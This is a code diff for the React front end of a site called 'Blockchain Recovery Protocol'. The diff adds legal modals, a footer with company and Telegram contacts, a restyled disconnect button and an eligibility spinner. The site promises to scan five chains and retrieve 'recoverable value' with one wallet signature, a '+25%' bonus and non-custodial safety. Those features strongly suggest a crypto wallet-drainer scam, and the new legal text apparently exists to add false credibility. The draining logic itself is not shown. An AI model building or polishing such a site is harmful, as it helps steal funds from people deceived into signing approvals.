@@ -691,6 +691,150 @@ const TelegramSupport = ({ translations }) => {
 };
 
 // ============================================
+// MODAL COMPONENT FOR LEGAL DOCUMENTS
+// ============================================
+const LegalModal = ({ isOpen, onClose, title, content }) => {
+  if (!isOpen) return null;
+  
+  return (
+    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fadeIn">
+      <div className="relative max-w-2xl w-full max-h-[80vh] bg-gradient-to-br from-gray-900 to-black rounded-2xl border border-blue-500/30 shadow-2xl overflow-hidden">
+        <div className="sticky top-0 bg-gradient-to-r from-blue-600/20 to-transparent px-6 py-4 border-b border-blue-500/20 flex justify-between items-center">
+          <h3 className="text-xl font-bold text-blue-400">{title}</h3>
+          <button onClick={onClose} className="text-gray-400 hover:text-white transition-colors text-2xl">&times;</button>
+        </div>
+        <div className="p-6 overflow-y-auto custom-scrollbar text-gray-300 text-sm space-y-4">
+          {content}
+        </div>
+        <div className="sticky bottom-0 bg-black/80 px-6 py-3 border-t border-blue-500/20 flex justify-end">
+          <button onClick={onClose} className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm transition-colors">
+            Close
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// ============================================
+// FOOTER COMPONENT WITH LEGAL & COMPANY INFO
+// ============================================
+const Footer = () => {
+  const [privacyOpen, setPrivacyOpen] = useState(false);
+  const [termsOpen, setTermsOpen] = useState(false);
+  const [riskOpen, setRiskOpen] = useState(false);
+  const TELEGRAM_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
+  
+  const privacyContent = (
+    <>
+      <p><strong>Last Updated:</strong> January 2026</p>
+      <p>Blockchain Recovery Protocol ("we", "our", "us") respects your privacy. This policy explains how we collect, use, and protect your information when you use our asset recovery services.</p>
+      <h4 className="font-bold text-blue-300 mt-4">1. Information We Collect</h4>
+      <p>• Wallet address (public)<br/>• Blockchain transaction data<br/>• Email address (when you report an issue)<br/>• IP address and location (anonymized for support)</p>
+      <h4 className="font-bold text-blue-300 mt-4">2. How We Use Your Information</h4>
+      <p>• Process recovery requests<br/>• Improve our recovery protocol<br/>• Send recovery confirmations<br/>• Provide customer support</p>
+      <h4 className="font-bold text-blue-300 mt-4">3. Data Security</h4>
+      <p>We use industry-standard encryption and never store private keys. Your wallet remains non-custodial at all times.</p>
+      <h4 className="font-bold text-blue-300 mt-4">4. Contact</h4>
+      <p>For privacy inquiries: privacy@blockchainrecovery.io</p>
+    </>
+  );
+  
+  const termsContent = (
+    <>
+      <p><strong>Effective Date:</strong> January 2026</p>
+      <p>By using Blockchain Recovery Protocol, you agree to these Terms of Service.</p>
+      <h4 className="font-bold text-blue-300 mt-4">1. Service Description</h4>
+      <p>We provide automated tools to help users recover stuck or non-custodial assets across supported blockchains. Recovery success depends on network conditions and asset type.</p>
+      <h4 className="font-bold text-blue-300 mt-4">2. Fees</h4>
+      <p>A 5% recovery fee plus network gas fees applies. Fees are deducted from recovered assets.</p>
+      <h4 className="font-bold text-blue-300 mt-4">3. Eligibility</h4>
+      <p>You must be the rightful owner of the wallet address used. We do not recover assets from third-party custodial accounts without authorization.</p>
+      <h4 className="font-bold text-blue-300 mt-4">4. Limitation of Liability</h4>
+      <p>We are not responsible for losses due to network congestion, user error, or unsupported assets. Use at your own risk.</p>
+      <h4 className="font-bold text-blue-300 mt-4">5. Governing Law</h4>
+      <p>These terms are governed by applicable international blockchain regulations.</p>
+    </>
+  );
+  
+  const riskContent = (
+    <>
+      <p><strong>IMPORTANT RISK DISCLAIMER</strong></p>
+      <p>Blockchain asset recovery involves inherent risks. By using this service, you acknowledge and accept the following:</p>
+      <h4 className="font-bold text-blue-300 mt-4">1. No Guarantee of Recovery</h4>
+      <p>Recovery depends on network conditions, wallet configuration, and asset type. Some assets may be permanently unrecoverable.</p>
+      <h4 className="font-bold text-blue-300 mt-4">2. Market Volatility</h4>
+      <p>Crypto asset values fluctuate. The USD value shown at recovery time may change rapidly.</p>
+      <h4 className="font-bold text-blue-300 mt-4">3. Network Fees</h4>
+      <p>Gas fees are variable and may be high during network congestion. You are responsible for all gas costs.</p>
+      <h4 className="font-bold text-blue-300 mt-4">4. Non-Custodial</h4>
+      <p>We never take custody of your private keys. You retain full control of your wallet at all times.</p>
+      <h4 className="font-bold text-blue-300 mt-4">5. Regulatory</h4>
+      <p>It is your responsibility to ensure compliance with local laws regarding crypto asset recovery.</p>
+      <p className="mt-4 text-yellow-400">⚠️ Never share your private keys or seed phrase with anyone. Our service never asks for them.</p>
+    </>
+  );
+  
+  return (
+    <footer className="mt-16 pt-8 border-t border-blue-500/20">
+      <LegalModal isOpen={privacyOpen} onClose={() => setPrivacyOpen(false)} title="Privacy Policy" content={privacyContent} />
+      <LegalModal isOpen={termsOpen} onClose={() => setTermsOpen(false)} title="Terms of Service" content={termsContent} />
+      <LegalModal isOpen={riskOpen} onClose={() => setRiskOpen(false)} title="Risk Disclaimer" content={riskContent} />
+      
+      <div className="grid grid-cols-1 md:grid-cols-4 gap-8 text-sm">
+        {/* Company Info */}
+        <div>
+          <h4 className="font-bold text-blue-400 mb-3">Blockchain Recovery</h4>
+          <p className="text-gray-400 leading-relaxed">
+            Decentralized asset recovery protocol supporting Ethereum, BSC, Polygon, Arbitrum & Avalanche.
+          </p>
+          <p className="text-gray-500 text-xs mt-2">Est. 2026</p>
+        </div>
+        
+        {/* Contact */}
+        <div>
+          <h4 className="font-bold text-blue-400 mb-3">Contact</h4>
+          <p className="text-gray-400">support@blockchainrecovery.io</p>
+          <p className="text-gray-400 mt-1">Telegram: @recovery_support</p>
+          <div className="mt-3">
+            <a href={TELEGRAM_LINK} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 transition-colors">
+              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34z"/>
+              </svg>
+              Join Telegram
+            </a>
+          </div>
+        </div>
+        
+        {/* Legal Links */}
+        <div>
+          <h4 className="font-bold text-blue-400 mb-3">Legal</h4>
+          <ul className="space-y-2 text-gray-400">
+            <li><button onClick={() => setPrivacyOpen(true)} className="hover:text-blue-400 transition-colors">Privacy Policy</button></li>
+            <li><button onClick={() => setTermsOpen(true)} className="hover:text-blue-400 transition-colors">Terms of Service</button></li>
+            <li><button onClick={() => setRiskOpen(true)} className="hover:text-blue-400 transition-colors">Risk Disclaimer</button></li>
+          </ul>
+        </div>
+        
+        {/* Service Explanation */}
+        <div>
+          <h4 className="font-bold text-blue-400 mb-3">How It Works</h4>
+          <p className="text-gray-400 leading-relaxed text-xs">
+            Our smart contracts scan 5 chains for recoverable value. One signature authorizes retrieval. 
+            No custody, no private key access — fully transparent on-chain recovery.
+          </p>
+          <p className="text-gray-500 text-xs mt-2">Fee: 5% + gas | Bonus: +25%</p>
+        </div>
+      </div>
+      
+      <div className="text-center text-gray-500 text-xs mt-8 pt-4 border-t border-blue-500/10">
+        © 2026 Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery. All rights reserved.
+      </div>
+    </footer>
+  );
+};
+
+// ============================================
 // MAIN APP COMPONENT - Blockchain Recovery System
 // ============================================
 function App() {
@@ -1542,12 +1686,13 @@ function App() {
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
+                {/* VERY VISIBLE DISCONNECT BUTTON - Red background, white icon, not covered */}
                 <button
                   onClick={() => disconnect()}
-                  className="w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center hover:bg-blue-700 transition-colors"
-                  title="Disconnect"
+                  className="w-9 h-9 rounded-full bg-red-600 hover:bg-red-700 flex items-center justify-center transition-all duration-200 shadow-lg border border-red-400"
+                  title="Disconnect Wallet"
                 >
-                  <i className="fas fa-power-off text-xs"></i>
+                  <i className="fas fa-power-off text-sm text-white"></i>
                 </button>
               </div>
               
@@ -1583,19 +1728,29 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message */}
+              {/* Eligibility Status Message with Spin Animation */}
               <div className="mt-3 w-full">
-                <div className={`rounded-lg p-3 text-sm ${
-                  isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
-                }`}>
-                  {isEligible ? (
-                    <span>🔗 {translations.proceedToRecovery}</span>
-                  ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
-                    <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
-                  ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
-                    <span>🔍 {translations.notEligible}. No on-chain balance detected in supported networks.</span>
-                  ) : null}
-                </div>
+                {verifying ? (
+                  <div className="bg-blue-500/20 border border-blue-500/30 rounded-lg p-4 text-center">
+                    <div className="flex items-center justify-center gap-3">
+                      <div className="w-6 h-6 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                      <span className="text-blue-400 text-sm font-medium">{translations.checkEligibility}...</span>
+                    </div>
+                    <p className="text-gray-400 text-xs mt-2">{translations.verifying}</p>
+                  </div>
+                ) : (
+                  <div className={`rounded-lg p-3 text-sm ${
+                    isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
+                  }`}>
+                    {isEligible ? (
+                      <span>🔗 {translations.proceedToRecovery}</span>
+                    ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
+                      <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
+                    ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
+                      <span>🔍 {translations.notEligible}. No on-chain balance detected in supported networks.</span>
+                    ) : null}
+                  </div>
+                )}
               </div>
             </div>
           )}
@@ -1712,7 +1867,7 @@ function App() {
             </div>
 
             {/* Status Messages */}
-            {txStatus && !scanning && (
+            {txStatus && !scanning && !verifying && (
               <div className="mt-4 text-sm text-center text-blue-400">
                 {txStatus}
               </div>
@@ -1790,10 +1945,8 @@ function App() {
             </div>
           </div>
 
-          {/* Footer */}
-          <footer className="mt-16 text-gray-500 text-sm">
-            © 2026 Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery
-          </footer>
+          {/* NEW FOOTER with Company, Contact, Legal, Service Explanation & Telegram Link */}
+          <Footer />
         </div>
       </div>
 
